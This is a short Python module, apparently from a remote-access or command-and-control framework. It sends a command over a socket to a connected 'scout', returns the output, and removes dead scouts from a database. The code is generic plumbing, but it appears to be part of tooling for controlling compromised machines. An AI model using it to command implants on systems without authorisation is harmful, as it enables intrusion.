# API
# done
import socket
import pyiris_api.library.modules.send_all as send_all
import pyiris_api.library.modules.recv_all as recv_all


def main(self, sock, command):
    try:
        send_all.main(sock, command)
        data = recv_all.main(sock)
        self.log.blank(data)
        return {"status": "ok", "message": "", "data": {"scout_output": str(data)}}
    except socket.error:
        try:
            self.log.err('Scout is dead, removing from database...')
            currently_bridged = self.config.bridged_to
            self.config.bridged_to = None
            del (self.config.scout_database[currently_bridged])
            self.config.change = True
        except IndexError:
            self.log.err('Scout does not exist in database!')
        return {"status": "error", "message": "", "data": {"scout_output": '[-]Scout is dead, removing from database...'}}
